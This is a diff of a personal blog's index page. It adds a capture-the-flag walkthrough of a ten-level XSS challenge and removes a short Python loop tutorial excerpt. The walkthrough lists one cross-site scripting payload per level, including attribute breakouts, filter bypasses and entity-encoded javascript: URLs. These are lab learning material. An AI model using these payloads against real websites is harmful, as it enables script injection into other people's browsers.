@@ -98,6 +98,32 @@
         <div class="content-wrapper">
           <div id="content" class="content"><section id="posts" class="posts"><article class="post">
     <header class="post-header">
+      <h1 class="post-title"><a class="post-link" href="/2021/02/11/XSS-challenge-tour/">XSS-challenge-tour</a>
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-02-11
+        </span><span class="post-category">
+            <a href="/categories/XSS/">XSS</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-content"><h3 id="level1"><a href="#level1" class="headerlink" title="#level1"></a>#level1</h3><p><img src="/images/pasted-256.png" alt="upload successful"><br>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="#level2"></a>#level2</h3><p><img src="/images/pasted-257.png" alt="upload successful"><br>payload:<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="#level3"></a>#level3</h3><p><img src="/images/pasted-258.png" alt="upload successful"><br>payload:<code>&#39; onmouseover=&#39;alert(1)</code></p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="#level4"></a>#level4</h3><p><img src="/images/pasted-259.png" alt="upload successful"><br>payload:<code>&quot;onmouseover=&quot;alert(1)</code></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="#level5"></a>#level5</h3><p><img src="/images/pasted-260.png" alt="upload successful"><br>payload:<code>xxx&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;</code></p>
+<h3 id="level6"><a href="#level6" class="headerlink" title="#level6"></a>#level6</h3><p><img src="/images/pasted-261.png" alt="upload successful"><br>payload:<code>111&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
+<h3 id="level7"><a href="#level7" class="headerlink" title="#level7"></a>#level7</h3><p><img src="/images/pasted-263.png" alt="upload successful"><br>payload:<code>xx&quot; oonnmouseover=&quot;alert(1)</code></p>
+<h3 id="level8"><a href="#level8" class="headerlink" title="#level8"></a>#level8</h3><p><img src="/images/pasted-264.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
+<h3 id="level9"><a href="#level9" class="headerlink" title="#level9"></a>#level9</h3><p><img src="/images/pasted-265.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p>
+<h3 id="level10"><a href="#level10" class="headerlink" title="#level10"></a>#level10</h3><p><img src="/images/pasted-266.png" alt="upload successful"><br>payload:<code>?t_sort=&quot; onclick=&quot;alert(1)&quot; type=</code></p>
+
+        </div></article>
+      <article class="post">
+    <header class="post-header">
       <h1 class="post-title"><a class="post-link" href="/2021/01/30/Github-wp/">Ctfhub-wp</a>
         </h1>
 
@@ -267,26 +293,6 @@
     <div class="post-content"><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="#常用函数"></a>#常用函数</h3><p>*字符显示格式<br>title():以首字母大写的形式显示单词<br>upper():字符串全部大写<br>lower():字符串全部小写</p>
           <div class="read-more">
             <a href="/2020/02/03/Python-4/" class="read-more-link">Read more..</a>
-          </div>
-        </div></article>
-      <article class="post">
-    <header class="post-header">
-      <h1 class="post-title"><a class="post-link" href="/2020/02/03/Python-3/">Python(3)</a>
-        </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2020-02-03
-        </span><span class="post-category">
-            <a href="/categories/Pythom/">Pythom</a>
-            </span>
-        </div>
-    </header>
-
-    <div class="post-content"><h3 id="循环停止的三种方法"><a href="#循环停止的三种方法" class="headerlink" title="#循环停止的三种方法"></a>#循环停止的三种方法</h3><p>1）<code>while循环</code>中使用条件语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str&#x3D;&quot;what&#39;s your name?:&quot;</span><br><span class="line">message&#x3D;&#39;&#39;</span><br><span class="line">while message !&#x3D; &#39;quit&#39;:</span><br><span class="line">    message&#x3D;input(str)</span><br><span class="line">    </span><br><span class="line">    if message !&#x3D;&#39;quit&#39;</span><br><span class="line">    print(message)</span><br></pre></td></tr></table></figure>
-          <div class="read-more">
-            <a href="/2020/02/03/Python-3/" class="read-more-link">Read more..</a>
           </div>
         </div></article>
       <nav class="pagination"><a class="next" href="/page/2/">
